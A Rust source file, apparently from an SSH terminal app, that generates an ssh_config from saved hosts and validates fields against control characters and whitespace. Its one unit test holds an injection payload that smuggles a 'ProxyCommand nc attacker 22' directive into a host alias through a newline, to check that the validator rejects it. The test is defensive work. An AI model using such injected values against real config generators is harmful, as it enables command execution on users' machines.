use crate::host_store::{atomic_write, ensure_config_dir};
use crate::models::Host;
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};

// Set once this process has written a config that reflects the current host
// list. hosts_save regenerates on every change, so callers that merely need a
// valid config on disk (spawn/probe) can skip the load-and-rewrite.
static SSH_CONFIG_WRITTEN: AtomicBool = AtomicBool::new(false);

pub(crate) fn ensure_ssh_config() -> Result<(), String> {
    if SSH_CONFIG_WRITTEN.load(Ordering::Acquire) && get_ssh_config_path().exists() {
        return Ok(());
    }
    let hosts = crate::host_store::hosts_load()?;
    generate_ssh_config(hosts)
}

pub(crate) fn get_ssh_config_path() -> PathBuf {
    dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("xtermius")
        .join("ssh_config")
}

fn reject_control_chars(field: &str, value: &str) -> Result<(), String> {
    if value
        .chars()
        .any(|ch| ch == '\n' || ch == '\r' || ch.is_control())
    {
        return Err(format!(
            "SSH config {field} contains unsupported control characters"
        ));
    }
    Ok(())
}

fn reject_whitespace(field: &str, value: &str) -> Result<(), String> {
    if value.chars().any(char::is_whitespace) {
        return Err(format!("SSH config {field} must not contain whitespace"));
    }
    Ok(())
}

fn quote_ssh_config_value(value: &str) -> String {
    if value.chars().any(char::is_whitespace) {
        format!("\"{}\"", value.replace('\\', "\\\\").replace('"', "\\\""))
    } else {
        value.to_string()
    }
}

fn validate_host_for_ssh_config(host: &Host) -> Result<(), String> {
    let alias = if host.alias.trim().is_empty() {
        host.hostname.trim()
    } else {
        host.alias.trim()
    };
    if alias.is_empty() {
        return Err("SSH config alias is required".to_string());
    }
    reject_control_chars("alias", alias)?;
    reject_whitespace("alias", alias)?;

    let hostname = host.hostname.trim();
    if hostname.is_empty() {
        return Err(format!("SSH config hostname is required for host {alias}"));
    }
    reject_control_chars("hostname", hostname)?;
    reject_whitespace("hostname", hostname)?;

    let user = host.user.trim();
    if !user.is_empty() {
        reject_control_chars("user", user)?;
        reject_whitespace("user", user)?;
    }

    if let Some(identity_file) = host
        .identity_file
        .as_ref()
        .map(|v| v.trim())
        .filter(|v| !v.is_empty())
    {
        reject_control_chars("identity_file", identity_file)?;
    }
    if let Some(proxy_jump) = host
        .proxy_jump
        .as_ref()
        .map(|v| v.trim())
        .filter(|v| !v.is_empty())
    {
        reject_control_chars("proxy_jump", proxy_jump)?;
        reject_whitespace("proxy_jump", proxy_jump)?;
    }
    Ok(())
}

#[tauri::command]
pub fn generate_ssh_config(hosts: Vec<Host>) -> Result<(), String> {
    ensure_config_dir()?;
    let mut config = String::new();
    for host in hosts {
        if host.deleted {
            continue;
        }
        validate_host_for_ssh_config(&host)?;
        let alias = if host.alias.trim().is_empty() {
            host.hostname.trim().to_string()
        } else {
            host.alias.trim().to_string()
        };
        config.push_str(&format!("Host {}\n", alias));
        config.push_str(&format!("  HostName {}\n", host.hostname.trim()));
        if !host.user.trim().is_empty() {
            config.push_str(&format!("  User {}\n", host.user.trim()));
        }
        if host.port != 22 {
            config.push_str(&format!("  Port {}\n", host.port));
        }
        if let Some(identity_file) = host
            .identity_file
            .as_ref()
            .map(|v| v.trim())
            .filter(|v| !v.is_empty())
        {
            config.push_str(&format!(
                "  IdentityFile {}\n",
                quote_ssh_config_value(identity_file)
            ));
            config.push_str("  IdentitiesOnly yes\n");
        }
        if let Some(proxy_jump) = host
            .proxy_jump
            .as_ref()
            .map(|v| v.trim())
            .filter(|v| !v.is_empty())
        {
            config.push_str(&format!("  ProxyJump {}\n", proxy_jump));
        }
        config.push_str("  ServerAliveInterval 30\n");
        config.push('\n');
    }
    let path = get_ssh_config_path();
    atomic_write(&path, config.as_bytes())?;
    SSH_CONFIG_WRITTEN.store(true, Ordering::Release);
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::generate_ssh_config;
    use crate::models::Host;

    fn host_with_alias(alias: &str) -> Host {
        Host {
            id: "1".to_string(),
            sort_order: Some(0),
            name: "prod".to_string(),
            alias: alias.to_string(),
            hostname: "example.com".to_string(),
            user: "root".to_string(),
            port: 22,
            password: None,
            has_password: false,
            host_insights_enabled: true,
            host_live_metrics_enabled: true,
            identity_file: None,
            proxy_jump: None,
            env_vars: None,
            encoding: Some("utf-8".to_string()),
            tags: vec![],
            notes: "".to_string(),
            updated_at: "2026-05-03T00:00:00Z".to_string(),
            deleted: false,
        }
    }

    #[test]
    fn rejects_newline_in_alias() {
        let err = generate_ssh_config(vec![host_with_alias("prod\n  ProxyCommand nc attacker 22")])
            .unwrap_err();
        assert!(err.contains("alias"));
    }
}
